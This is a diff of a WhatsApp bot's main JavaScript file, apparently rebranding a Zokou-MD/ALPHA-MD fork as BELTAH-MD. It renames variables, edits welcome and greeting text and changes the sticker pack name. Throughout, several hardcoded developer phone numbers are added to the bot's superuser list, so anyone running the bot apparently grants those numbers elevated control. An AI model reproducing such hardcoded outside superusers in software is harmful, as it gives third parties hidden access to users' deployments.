@@ -49,7 +49,7 @@ const handleAntiDelete = require("./Vars/antidelete");
 const handleAntiLink = require("./Vars/antilink");
 const handleEvalCommand = require('./Vars/eval');
 const handleAutoBlock = require('./Vars/autoblock');
-const handleAntiLinkBadWordsAndTags = require("./Vars/groupcontrol");
+/*const handleAntiLinkBadWordsAndTags = require("./Vars/groupcontrol");*/
 const handleAutoReact = require("./Vars/autoreact");
 const { activateCrons, handleContactsUpsert } = require('./Vars/crons'); 
 const handleAutoRead = require("./Vars/autoread");
@@ -190,12 +190,12 @@ zk.ev.on('call', async (callData) => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const keith = '254737681758';
-            const Keithkeizzah = '254114141192';
+            const Beltah = '254737681758';
+            const Beltahtech = '254114141192';
             const Ghost = "254737681758";
-            const Sams = '254114141192';
+            const Brian = '254114141192';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, keith, Keithkeizzah, Ghost, Sams, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, Beltah, Beltahtech, Ghost, Brian, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
@@ -502,7 +502,7 @@ function mybotpic() {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'ALPHA-MD',
+                pack: 'BELTAH-MD',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -652,8 +652,7 @@ zk.ev.on('group-participants.update', async (group) => {
                 msg += `║ Hello @${membre.split("@")[0]}\n`;
             }
 
-            msg += `║ *You are welcomed here* _You MAY read the group description FOR more info and Avoid getting removed_
-            
+            msg += `║ *You are welcomed here* You MAY read the group description FOR more info and Avoid getting removed. 
      
  ╰═══◇◇═══⊷
             
@@ -851,8 +850,7 @@ ${metadata.desc}`;
         };
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `Hello👋  *${conf.OWNER_NAME}*  😎 ,
-                 *${getGreeting()},*      
+                let cmsg = `Hello *${conf.OWNER_NAME}*, *${getGreeting()},*      
  ╭════⊷         
 ║ *『 ${conf.BOT} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
 ║    Prefix 🫧 : [ ${prefixe} ]
